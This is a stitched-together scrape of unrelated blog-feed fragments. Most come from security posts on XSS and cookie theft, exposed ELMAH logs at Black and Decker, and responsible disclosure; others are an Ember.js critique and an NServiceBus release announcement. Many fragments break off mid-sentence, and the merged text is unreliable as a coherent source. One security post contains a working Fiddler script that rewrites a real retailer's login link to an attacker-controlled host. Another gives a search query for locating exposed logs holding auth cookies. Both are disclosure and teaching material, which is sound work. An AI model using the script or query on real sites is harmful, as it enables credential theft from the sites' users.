logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada. Again.</p><p>Disclosure is indeed hard.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/93WStnpJ4b0\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1132}}

It's entirely likely that I didn't study Ember long enough, or maybe I didn't give it the\"time to soak in\" that it deserved. Either way I punted on my efforts to bring an Ember title to Tekpub.</p><p>Normally I'd just go about my business and sidestep posts like this one - but today I had a conversation with Trek Glowacki (core dev on the Ember team) and he was confused as to my confusion. I offered to blog my thoughts - he couldn't understand the points I was making about my confusion.</p><p>So here's that post, stripped of hyperbole and\"it's ON FIRE\" statements. It's my honest take on this framework.</p><h2>You Keep Telling Me It's MVC...</h2><p>Yes, the concept of MVC has been contorted over the past decade as web frameworks have adopted it and massaged it to their own ends. What does this mean?</p><ul><li>Controllers in web MVC have a very short lifespan, and there are a lot of them typically</li><li>Views dont' communicate directly to a controller - they have to use an intermediary layer in HTTP (headers, querystring, etc)</li><li>Models are injected into views by Controllers</li><li>Controllers don't command the views directly</li></ul><p>In more classic MVC (aka\"Desktop\") your controllers are typically spun up when the app starts, and configured one time, right there. A controller's job is to command aspects of the view as data changes, and to change the model when things on the view happen that mandate it.</p><p>The model encapsulates the business logic for whatever its modeling, the view presents the data in a nicely formatted way to the user, and the controller sits between. I think we agree on this much - so what's the problem?</p><p>OK this is MVC as far as I have come to know it. There are lots of denominations I am sure - I have to think the church of MVC is about as crowded as the church of REST on any given holiday but there's room for all of us so let's move on...</p><h2>Separation. Only Not.</h2><p>In EmberJS, the<a href=\"http://emberjs.com/guides/controllers/\">controller's job is changed a bit</a>:</p><blockquote><p>A controller may have one or both of these responsibilities:</p><ul><li>Representing a model for a template.</li><li>Storing application properties that do not need to be saved to the server.</li></ul><p>Most of your controllers will be very small. Unlike other frameworks, where the state of your application is spread amongst many controllers, in Ember.js, we encapsulate that state in the router. This allows your controllers to be lightweight and focused on one thing.</p></blockquote><p>For me, this is where the confusion begins. A controller proxies the model, and then exposes itself to the rendering engine so that the view can consume it (you may need to read that sentence twice).

But as far as I understand it, this is about as tightly bound as we can make things.</p><p>As stated above, a controller\"proxies\" the model onto itself for use in the view. I'm trying my best to reconcile this with the notion that a controller (classically speaking) is supposed to ... well<strong>control</strong>the view. Here, it's not doing that.</p><p>If I'm not mistaken, the view is controlling the controller and the model is nowhere to be found. Well that's not true I spose:<strong>the model is the controller</strong>. Sort of. Well it's not literally the same thing in concept but in practice the controller and the model are one. Bound. Together. Tightly.</p><p>In Angular this separation is achieved by a\"scope\" object that is, basically, a vehicle of sorts that gets passed between the controller and the view:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">PersonCtrl</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">people</span><span class=\"o\">=</span><span class=\"p\">[{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Rob\"</span><span class=\"p\">},</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Mary\"</span><span class=\"p\">}]</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>In your view, you declare which controller you're using and then consume the information that's on the scope:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-controller=</span><span class=\"s\">'PersonCtrl'</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>The downside to this approach is that your HTML is\"compromised\", if you will, and many developers don't like that.

Some people do, and I respect that.</p><p>But let's get to the controller code. Notice that the $scope is injected? That's Dependency Injection at work and is a core concept in Angular which greatly helps testability.</p><p>Now you might be saying\"but ROB! The controller is declared directly in the view!

But in doing so they marginalized the controller (which was their intent, if you read the controller's definition).</p><p>With Backbone I know what I'm getting into. I can use the Router as a controller (it used to be called that btw) and when things get a bit nuts, I can create a controller of my very own (<a href=\"http://marionettejs.com\">or just use MarionetteJS that has this concept built in</a>).</p><h2>Naming</h2><p>Ember relies heavily on naming conventions that must not only follow<a href=\"http://www.emberist.com/2012/04/09/naming-conventions.html\">syntax guidelines, but also casing guidelines</a>.</p><p>The reason for this is straightforward: Ember will generate code for you if you just need basic, boilerplated stuff, alleviating you from tedious coding which is rampant in other frameworks like Backbone.</p><p>The problem I have with this is that the relationship between things is in name only, and that seems like it's a rather brittle rule. It also tells me that I have to know the naming conventions<strong>as well as</strong>how to use the framework - which is fine, typically, as long as there's a big payoff.</p><p>And that's where I get stuck (again):<strong>what's the payoff, aside from implicit code generation, for following the naming conventions here?</strong>.

Sometimes I wonder if it's being taken too far.</p><p><img src='http://wekeroad.com/images/incantations.jpg'/></p><p><h2>Conventions? Curations? Innovations?</h2><p>Convention over Configuration is a\"pull\" - meaning that it's derived from practice. Conventions evolve and ultimately people agree on them… thus the term\"convention\".</p><p>Rails made use of this most profoundly when it was introduced. From<a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles Bowkett</a>:</p><blockquote><p>When Rails first arrived, in many instances, it took the greatest ideas and most common use cases of Web development, streamlined them, simplified their developer interface, and repackaged them within cleaner APIs.</p></blockquote><p>Rails also decided to innovate at the same time, and mixed together its conventions with its innovations. The results have been mixed (in my experience):</p><ul><li>The Asset Pipeline was an interesting solution to a problem that I'm not sure many people had. I spent more time trying to get the thing to work as expected - and then finally tossed it.</li><li>I used CoffeeScript for a bit, but don't care much for it. This decreases the interest in the Asset Pipeline.</li><li>I like RSpec. I like Factories vs. Fixtures.<a href=\"http://www.youtube.com/watch?v=obOd7WrrTWQ\">I tend to completely replace the entire testing experience Rails</a>.</li></ul><p>These aren't complaints, really. Every framework you use needs to be modified to a degree to fit how you work - but I do agree with Giles' assertion:</p><blockquote><p>it is literally impossible to impose a convention on a community. It is a contradiction in terms, Orwellian doublespeak, and the human-language equivalent of a syntax error.</p></blockquote><p>For all of the syntax niggling, Rails still lets me do what I want/need to do so I'm a happy camper. I also think the\"conventions\" it once imposed are being tweaked by innovation and becoming something else.</p><p><a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles calls it\"Curation over Configuration\"</a>and I think I agree with him.</p><h2>Put Your Left Foot Here, Touch Your Nose, And…</h2><p>It seems that most frameworks (of any kind) are beginning to follow Rails' example by introducing some level of Convention over Configuration. This is a great timesaver,<strong>unless there are no conventions to adopt</strong>.</p><p>Which is something I've encountered with EmberJS. No, I'm not going to rant on Ember - I'm still pursuing Trek's prediction:</p><p><blockquote class=\"twitter-tweet\"><p>@<a href=\"https://twitter.com/locks\">locks</a>next post will be about @<a href=\"https://twitter.com/robconery\">robconery</a>'s Road to Damascus Moment. ;)</p>— Trek Glowacki (@trek)<a href=\"https://twitter.com/trek/status/310882156425650177\">March 10, 2013</a></blockquote><script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script></p><p>I haven't given up on Ember - even though I said as much in my last post. Well it's partly<strong>because of my last post</strong>that I can't give up - it wouldn't be fair of me would it :).</p><p>As I dive into Ember more, however,<a href=\"http://emberjs.com/guides/concepts/naming-conventions/\">I've begun musing on\"conventions\" in general</a>:</p><blockquote><p>Ember.js uses naming conventions to wire up your objects without a lot of boilerplate. You will want to use the conventional names for your routes, controllers and templates.</p></blockquote><p>By\"convention\" the team means\"prescription\". This is important because<strong>there is no convention</strong>when it comes to Single Page Applications in the traditional sense of the word\"convention\".<strong>Their naming guidelines are prescriptive</strong>- and something more.</p><p>A lot of frameworks do this kind of thing: Rails, Django, ASP.NET MVC (and I'm sure many others) expect certain files (views, for instance) to be in a particular place (which you can usually override). I like this - it promotes consistency.</p><p>Ember takes this to a different level, however. If you name things a certain way<a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/getting-into-ember-js/\">you can benefit from background code generation</a>:</p><blockquote><p>One of the ways that Ember.js helps to minimize the amount of code needed and handle things for you behind the scenes is through naming conventions. The way that you define and name your routes (and resources) impacts the naming of your controllers, models, views and templates</p></blockquote><p><strong>At what point do we call these\"Incantations\" instead of\"Conventions\"</strong>?</p><h2>The Light Isn't Blinding Me Yet</h2><p>Again - not here to pick on Ember. Strong naming has been around for a while (though I'm not sure I've seen it trigger code generation) and, far from condemning Ember - I applaud the team for taking a bold step.</p><p>I'll admit that it's not immediately sitting right with me, but I'm going to give it time to see how hard it will be for the incantations to work their way into daily memory.

Not all aspects of it, mind you, but the prevalence of website hacks would seem to indicate that plenty of people are struggling to get it right.</p><p>On the other hand,<em>insecurity</em>can be very easy. What I mean by this is that sometimes it can be the smallest change to a website that blows the security wide open.</p><p>Last week someone passed me a private note about Black and Decker, or more to the point, they passed me a link to an unsecured ELMAH log. For the uninitiated, ELMAH logs and their discovery via Google is something<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">I’ve written about before</a>. In fact in this very case it was someone simply searching for some info on ELMAH that lead to this discovery – it’s that easy.</p><p>Now I want to stress that<strong><em>this is not intended to be all about Black and Decker</em></strong>and before posting this I did privately contact them and they have now correctly secured the logs. In fact<strong><em>there are tens of thousands of<a href=\"https://www.google.com/search?q=inurl%3Aelmah.axd+ASPXAUTH\">Google results for publicly exposed ELMAH logs</a></em></strong>so clearly this is a very prevalent risk. Let me first share the video on what you can do with exposed ELMAH logs then I’ll come back around to the point of this post:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/6ipVqkUm6Gw?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>That should put things into context regarding the risk of exposed ELMAH logs and it goes<em>well</em>beyond just session hijacking. For example the risk includes access to:</p><ol><li>Customer email addresses as they’re stored in the cookie</li><li>IP address of users (including of individual customers per the previous point)</li><li>Passwords (these are also sometimes stored in cookies)</li><li>Referrers (discloses entry points into the site)</li><li>Any other data on the site that is accessible if the session can be hijacked</li></ol><p>Keep in mind that there are tens of thousands of log entries in this particular site so there’s quite a profile an attacker could have built up.</p><p>Here’s the point I want to make:<strong><em>a frankly massive security hole like exposed ELMAH logs can occur as a result of the smallest configuration change</em></strong>and it begs the following questions:</p><p><strong>Is there any continuous security scanning of the site?</strong>This was a very basic error and in fact my own very basic<a href=\"https://asafaweb.com/\">ASafaWeb</a>scanner could have caught this on a daily scheduled scan and reported it within 24 hours of the risk occurring. Other commercial products could have identified a far broader range of risks but the point is that security scanning needs to be<em>continuous</em>, not just a one off, not on an annual basis, not just on major changes but<em>all the time</em>.</p><p><strong>Who can release changes?</strong>You’ve gotta wonder if a case like this was just a junior dev not realising what they were doing. Mind you, I’ve seen plenty of experienced devs make similar mistakes but it begs the question: just how easy is it to slip something through into a production? Is anyone actually overseeing the process? Or does one person have a few beers on a Friday afternoon and push the “publish” button?</p><p><strong>What’s the post-release review process?</strong>It’s<em>extremely</em>easy for configuration related vulnerabilities to slip through during the release process. For example a developer just wants to quickly check the details of an obscure error in a production environment so they release with verbose errors (i.e. turn off custom errors in ASP.NET) and promise themselves they’ll lock it down later. The release process should ideally catch this and set off all sorts of alarms.</p><p><strong>Are you contactable for when things go wrong?</strong>I hadn’t planned on including this section originally but given the way things played out (more on that another time), it does illustrate an important point. It was<em>extremely</em>difficult to get in touch with anyone from Black and Decker using social media and published email addresses and I eventually got through to them in a very round-a-bout fashion. It’s very hard for people to do the right thing and disclose privately when they can’t get in touch with you!</p><p>Black and Decker presented a good opportunity to illustrate the risk because of their sheer scale. This is a multinational organisation pulling in $6B a year and employing 27,000 people and something so simple slipped past them, is it any wonder that so many companies with such fewer resources struggle? And I’ll stress again – there is (unfortunately) nothing very unique about them having a risk of this nature – it’s alarmingly common as it’s so simple to do. Insecurity is indeed, easy.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/1gV-R5Qrv3k\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1138}}

It’s been over a year since we released version 3.0 and in that time, the adoption of NServiceBus has totally exploded. I know I always talk about the big brand names but there have been hundreds of small to medium companies that have been seeing real success on this platform.</p><p>OK – one big name. I feel like I have to. If you’ve been to McDonald’s and purchased a happy meal for your kids – that’s going through NServiceBus. Yeah, at any McDonald’s around the world – and not just happy meals.</p><h3>What’s in the box</h3><p>While NServiceBus has historically used MSMQ as its primary queuing infrastructure, we now support RabbitMQ and ActiveMQ out of the box so you have full AMQP compliance at the wire level, and we’re soon going to be releasing a fully supported IBM MQ transport.</p><p>You can see the complete release notes for version 4 of NServiceBus <a href=\"http://particular.net/blog/nservicebus-v4.0-release-notes\">here</a>.</p><p>For those organization who’ve been ignoring NServiceBus until now because they prefer having everything in a central database, we now support using database tables as queues. </p><p>While I’ve always been big on queuing infrastructure, I understand that it takes time for an organization to change and I hope that this will provide a smooth transition path.</p><h3>Try it online now</h3><p>If you’re in a locked-down corporate environment that won’t let you install anything on your box, but you’d still like to try NServiceBus out, we’ve got the solution for you.</p><p>Try our new hands-on labs – you’ll get remote access to a machine in the cloud with NServiceBus pre-installed on it ready to go.</p><p>We’ve even got a scale-out lab where you’ll see just how easy it is to build a 4 machine NServiceBus solution.</p><p><a href=\"http://particular.net/HandsOnLabs\">Try the labs</a>.</p><h3>Modeling</h3><p>I’ve talked before about some modeling tools we’ve been working on for NServiceBus and I’m happy to say that they’re now ready for public beta. Instead of the name NServiceBus Studio (which overlapped far to much with Visual Studio), we’re now calling this <a href=\"http://particular.net/ServiceMatrix\">ServiceMatrix</a>.</p><p><img src=\"http://particular.net/Media/Default/Studio/ServiceMatrixScreen.png\" alt=\"ServiceMatrix\" title=\"ServiceMatrix\" /></p><p>ServiceMatrix makes building message-driven service-oriented solutions an absolute joy allowing you to operate at much higher levels of abstraction. Find out more <a href=\"http://particular.net/ServiceMatrix\">here</a>.</p><h3>Debugging</h3><p>While the looser-coupling of message-driven systems makes them more scalable and maintainable, it does make debugging harder since you can’t just step-through one function to another when everything is invoked asynchronously.</p><p>For that reason, we’ve been working on visualization and management tooling to make things easier. By leveraging the built-in auditing of NServiceBus, we can show you the message causation chain – which command caused which event, which in turn caused what other messages to flow. We also hook into the error queue to show you when messages fail (in orange below) and the full stack trace of the exception.</p><p>Of course, you can always see the full body and headers of each message.</p><p><img src=\"http://particular.net/Media/Default/Profiler/InsightScreen.png\" alt=\"ServiceInsight\" title=\"ServiceInsight\" /></p><p>This tool, called <a href=\"http://particular.net/ServiceInsight\">ServiceInsight</a> is now in its second beta and the feedback has been overwhelming – “oh my God, how could you have waited this long to release this?!

For example, there was the piece on<a href=\"http://www.troyhunt.com/2013/05/heres-why-you-cant-trust-ssl-logos-on.html\">why you can’t trust SSL logos</a>, then how<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">loading login forms over HTTP but posting to HTTPS is pointless</a>and most recently, why those<a href=\"http://www.troyhunt.com/2013/06/understanding-risk-of-mixed-content.html\">mixed content warnings mean easy pickings for attackers on the transport layer</a>. All of these involve working demonstrations against real sites who just don’t quite get HTTPS.</p><p>Today’s example is about what happens when a login page is loaded securely, albeit embedded within an insecure page. This is a common security anti-pattern and you’ll see it on many sites. The example in the video is from<a href=\"http://www.countdown.co.nz/\">Countdown in New Zealand</a>but again, there are countless others out there.

Many of you may already be familiar with<a href=\"http://fiddler2.com/\">Fiddler</a>, the scripting option gives us the ability to manipulate unencrypted traffic on the wire just as an attacker might at any point in the network communication. Clearly an attacker at, say an ISP or running a rogue wireless hotspot wouldn’t be running Fiddler, but the mechanics of manipulating requests and responses is similar with other tools.</p><p>In this example I simply added the following script in the OnBeforeResponse event:</p><pre class=\"code\"><span style=\"color: blue\">if</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">HostnameIs</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"www.countdown.co.nz\"</span><span style=\"color: gray\">)&&</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">PathAndQuery</span><span style=\"color: gray\">==</span><span style=\"color: maroon\">\"/\"</span><span style=\"color: gray\">) {<br></span><span style=\"color: green\">// Remove any compression or chunking<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilDecodeResponse</span><span style=\"color: gray\">();<br><br></span><span style=\"color: blue\">var</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">System</span><span style=\"color: gray\">.</span><span style=\"color: black\">Text</span><span style=\"color: gray\">.</span><span style=\"color: black\">Encoding</span><span style=\"color: gray\">.</span><span style=\"color: black\">UTF8</span><span style=\"color: gray\">.</span><span style=\"color: black\">GetString</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">responseBodyBytes</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Change the path of the login form<br></span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">.</span><span style=\"color: black\">replace</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"/onecard/panels/customer-login\"</span><span style=\"color: gray\">,</span><span style=\"color: maroon\"><br>\"http://hackyourself.troyhunt.com/Countdown\"</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Set the response body to the changed body string<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilSetResponseBody</span><span style=\"color: gray\">(</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">);<br>}</span></pre><p>In other words, when the homepage is loaded simply replace the link to the login form from the original one to the attacker’s one that looks the same.

The theory goes that responsible disclosure is the<em>ethical</em>thing to do whilst airing website security dirty laundry publicly makes you an irresponsible cowboy, or something to that effect.</p><p>But of course these things are not black and white. On a daily basis I’ll see tweets about how a website is storing credentials in plain text: “Hey [insert name here], what’s the go with emailing my password, aren’t you protecting it?”. Is this “responsible”? I think it’s fair to say it’s not<em>irresponsible</em>, I mean the risk is obvious, right?</p><p>How about security risks such as an XSS flaw which might be a little more grey, but is still shared frequently in public? It’s not exactly going to land you the mother lode of sensitive data in a couple of clicks, but it could be used as part of a more sophisticated attack. Or move right on to the other end of the scale where serious flaws lead to serious breaches. It might be default credentials on an admin system or publicly accessible backups, the point is it’s in another realm of risk and impact altogether.</p><p>Anyway, the reason for this post is that a number of events over recent times have given me pause for what<em>I</em>consider responsible disclosure. These events are numerous and include incidents where I’ve ticked every responsibility box in the book and incidents where I’ve been accused of being, well, a cowboy. I wanted to capture – with as much cohesion as possible – what I consider to be responsible disclosure because sure enough, I’ll be called on this again in the future and I want to have a clear point of view that simply won’t fit into 140 characters.</p><p>I’d like to start with two disclosure stories that took very different tacks with different outcomes for both the sites and me personally. Here’s what happened:</p><a name='more'></a><h4>Disclosure story 1: Westfield</h4><p>Two years ago I wrote about<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html\">Find my car, find your car, find everybody’s car; the Westfield’s iPhone app privacy smorgasbord</a>. In short, the Westfield shopping centre here in Sydney down at Bondi had an app to help you find your car but it readily disclosed the license plate of every vehicle in the centre’s 2,550 car spaces via an improperly protected JSON feed. Oops.</p><p>This went straight up onto my blog and subsequently,<a href=\"http://www.theaustralian.com.au/australian-it/westfield-iphone-app-in-privacy-fiasco/story-e6frgakx-1226137939073\">straight into the national media</a>. I posted it in the morning and just a few hours later the system was offline. Shortly after that I had a call from the (rather sheepish) developers of it in the US. By mid-afternoon the General Manager had<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html#comment-309304475\">commented on my blog post</a>and later made contact personally. He called me that night and we had a very constructive discussion; there wasn’t any anger or malice, it was entirely “Holy shit, this isn’t cool, how do we fix it” which IMHO, was entirely the correct response as it lead to the system getting fixed very quickly.</p><p>tl;dr: the risk was removed almost instantly, the developers were open and receptive, the management was appreciative and hopefully developers everywhere got to learn a thing or two about securing their APIs. Perhaps most importantly though, at-risk customers were spared as quickly as possible from the potential ramifications of disclosing their personal movements.</p><h4>Disclosure story 2: Black and Decker</h4><p>This is very timely as it all took place last week. As I wrote about just yesterday in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk</a>, Black and Decker had exposed ELMAH logs. Their unfortunate architecture decision to store credentials in cookies (you heard me) meant these were recorded in the logs which numbered 50,000+. So here we have a veritable treasure trove of usernames, passwords, IP addresses, request headers, internal code and other titbits – clearly something to be disclosed privately and obviously given the significance they’d take it seriously and respond promptly. Or so I thought.</p><p>After recording the video for the aforementioned post on Monday afternoon last week (these are all Sydney times), I quickly reached out to Black and Decker on Twitter:</p><p><a href=\"https://twitter.com/troyhunt/status/336384092880908288\"><img width=\"487\" height=\"259\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS is there a private channel I can report a serious security vulnerability on your website through?

Finally<em>someone</em><em>from Microsoft</em>responds via Twitter and advises they have a relationship with Black and Decker. I privately email their @microsoft.com address on the evening of the 23rd (now the 10th contact) including the<a href=\"https://code.google.com/p/elmah/wiki/SecuringErrorLogPages\">ELMAH Securing Error Log Pages</a>link and they promptly pass it on. Come the morning of the 24th, here’s what happens:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log now protected at /elmah.axd\" src=\"http://lh4.ggpht.com/-GUFHmN1dpUc/UaUVqiTwnEI/AAAAAAAAFYI/TCOXa70NmcA/image311.png?imgmax=800\" border=\"0\"></p><p>Success! Looks like I’ve finally gotten through! Except, well, I hadn’t really:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log not protected at /foo/elmah.axd\" src=\"http://lh6.ggpht.com/-yrbc41G-kZE/UaUVsPH0tRI/AAAAAAAAFYQ/C1SGG9iHc3s/image61.png?imgmax=800\" border=\"0\"></p><p>This is a little issue that came up in<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">my original post on session hijacking with Google and ELMAH</a>and it’s because the handler is registered globally yet explicitly secured only when it appears in the root. It’s a simple fix that’s (now) explained very clearly on the ELMAH site (which I’d sent them), the handler just needs to be registered beneath the location in which it’s used.</p><p>So the 11th contact goes out and it’s back to Microsoft because I<em>still</em>haven’t had any personal contact from Black and Decker. I had a response from Microsoft just 9 minutes later even though it was about 19:30 local so kudos to them for their proactivity. Remember, this was all on the morning of the 24th (Friday last week) but by late that evening my time ELMAH was still accessible. Granted, it was evening over in the US but we’re now more than 100 hours into this saga.</p><p>Finally, come Saturday morning, ELMAH is secure. That’s four and a half days of time wasted from initial contact to securing the risk. Remember, this involved customers’ usernames and passwords on public display, no doubt in many cases the same ones they use for their email or to do their banking.</p><p>4 days after everything was resolved and 9 days since I first raised the risk, I’ve also not had any response from Black and Decker. Zero. Zip. Nada. Not a “Thanks mate” nor a “Mighty nice of you to point this out privately”, no “How might we fix this?” or “Is there anything else we should look at?”, just absolute silence. Now I don’t privately disclose in order to achieve any sort of personal benefit, but by my moral compass when you do someone a favour – particularly one that could save them a great deal of inconvenience – a little gratitude in response goes a long way.</p><p>This incident plus the Westfield one and literally dozens of others – some I’ve written about, many I’ve not – lead me to wonder: what circumstances predicate themselves to private disclosure? When is public a better option? I broke it down into three measures, let me explain.</p><h4>1. What is the purpose of disclosing the risk?</h4><p>Particularly when a public disclosure lands on the front page of the news and consequently on the CTO’s (or even CEO’s) desk, inevitably the question comes up – why’d he do it? What’s in it for him? What does this guy want from us?</p><p>On numerous occasions, after making a public disclosure I’ve had private responses which clearly indicate the sender is under the impression that I’m after money. You can almost read “Ok, how much do you want to help us fix this thing?” between the lines of an otherwise polite but curt response. This can<em>never</em>be the intent of disclosure, doing this would amount to nothing less than running an extortion racket.</p><p>The purpose<em>cannot</em>be self-serving, when this is the case there’s nothing to stop you from running around calling out every single vuln you find and to hell with the consequences. Whilst there’s unarguably a reputation boost from a carefully constructed public disclosure, there has to be a “greater good”.</p><p>The single most significant beneficiary of public disclosures I make are software developers. I want to help these guys understand the ins and outs of website security and nothing gets their attention more than publicly calling out examples. But just as importantly, you have to help them understand<em>why</em>the risks are, well, risks. Also just as importantly, you need help them understand how to fix those risks, not just stand there and give a “Ha Ha” Nelson Muntz style, that’s really not going to help anyone.</p><p><img width=\"400\" height=\"250\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Nelson Muntz - Ha Ha!\" src=\"http://lh5.ggpht.com/-lj7gA6jC_dE/UaUVt-0MNsI/AAAAAAAAFYY/8KQ3957hMOs/seven_bullies_062.png?imgmax=800\" border=\"0\"></p><p>Of course the other beneficiary is those who would be impacted if the risk was exploited. If disclosing the risk will lead to the site owner rectifying it<em>before</em>customers can be adversely impacted, then that’s a good thing. Which leads me neatly to the second point.</p><h4>2. Who is the victim if it’s exploited?</h4><p>When a vuln is disclosed, naturally there is a risk that someone will then exploit it. Who is impacted if that happens is extremely important because in the scheme of exploited website risks there are really two potential victims: the users of the site and the site owner.</p><p>In this context, website users are innocent parties, they’re simply using a service and expecting that their info will be appropriately protected. Public disclosure must not impact these guys, it’s simply not fair. Dumping passwords alongside email addresses or usernames, for example, is going to hurt this group. Yes, they shouldn’t haven’t reused their credentials on their email account but they did and now their mail is pwned. That’s a completely irresponsible action on behalf of those who disclosed the info and it’s going to seriously impact ordinary, everyday people.</p><p>On the other hand, disclosing XSS or TLS flaws doesn’t pose an immediate threat to consumers, an attacker still needs to go out and weaponise the risk. This might involve the attacker constructing phishing scams or organising themselves to the extent that they can actually go and sniff packets from at-risk users. Of course this happens, but it takes some effort, at least enough effort so that the site owner can fix or disable the feature in advance.</p><p>On the other hand, risks that impact only the site owner are, in my humble opinion, fairer game. The site owner is ultimately accountable for the security position of their asset and it makes not one iota of difference that the development was outsourced or that they rushed the site or that the devs just simply didn’t understand security. When the impact of disclosure is constrained to those who are ultimately accountable for the asset, whether that impact be someone else exploiting the risk or simply getting some bad press, they’ve only got themselves to blame.</p><h4>3. What is the likelihood of the risk being fixed?</h4><p>There are many instances on this blog where I’ve written about poor security. There are many instances<em>not</em>on this blog where I’ve privately written to website owners about poor security. Overwhelmingly, risks I’ve disclosed publicly have been taken seriously and equally overwhelming, risks I’ve disclosed privately haven’t been. There are exceptions, but there is no arguing the pattern and it’s exemplified by the Westfield and Black and Decker examples I opened with.</p><p>When a risk is disclosed publicly, the website owner is on notice. There is no arguing the increased 